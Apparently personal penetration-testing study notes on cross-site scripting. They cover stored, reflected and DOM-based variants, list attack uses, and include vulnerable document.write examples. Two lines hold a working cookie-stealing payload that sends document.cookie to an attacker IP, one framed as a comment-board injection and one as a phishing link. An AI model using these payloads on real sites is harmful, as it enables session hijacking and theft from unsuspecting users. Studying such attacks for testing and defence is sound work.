#xss cross site scripting dom based reflected persistent serverside

#USE CASES FOR XSS:
1. Account Hijacking - steal session cookies via Image method below, or other method
2. Password Theft - See password theft example at the bottom
3. Unauthorized Action - if a user has knowlege of other functions in javascript that can be performed only by an authorized user, those actions can be taken/manipulated to send sensitive data to the attacker, or perform actions on behalf of the user. 
4. Download plugins - BeEF and OWASP Xenotix XSS can be used to create payloads for reverse shells that if the user clicks to 'allow plugin', it can execute.
5. Keylogger - there is a javascript metasploit module for keylogging, that is XSS driven. 

#Stored/persistent excerpt that could be used for comment board or something:
<script>new Image().src="http://10.11.0.125/bogus.php?output="+document.cookie;</script>
Victim browses to the site that has XSS stored on the server, and the javascript is executed in the BROWSER,
and the cookie is transferred to the attacker from the Victim machine

#Reflected:
Attacker: "Here click on this:" http://something.com/somepage.php?id=<script>new Image().src="http://10.11.0.125/bogus.php?output="+document.cookie;</script>
Then attacker has session ID. 

#DOM-based:
A little more complicated, kind of like a cross between the two. Server loads page for user, page has references to DOM elements
not contained/passed to/associated with the server, and the URL can contain elements that modify that DOM element.

DOM example Server Side Code:
<script>
document.write("Site is at: " + document.location.href + ".");
</script>

DOM example Request:
GET http://someserver.com/somepage.php?id=whatever#<script>alert()</script>

DOM-Based logic note & testing: The ability to test may rely on a number of factors. If, for instance, the page checks with an if/else
statement to check the user agent, and one outcome includes a 'location.href' and the other does not, you may not discover this in 
testing, depending on your user agent. See this example code of that situation, from the owasp site referenced above:

<script>
var navAgt = navigator.userAgent;
 
if (navAgt.indexOf("MSIE")!=-1) {
     document.write("You are using IE as a browser and visiting site: " + document.location.href + ".");
}
else
{
    document.write("You are using an unknown browser.");
}
</script>
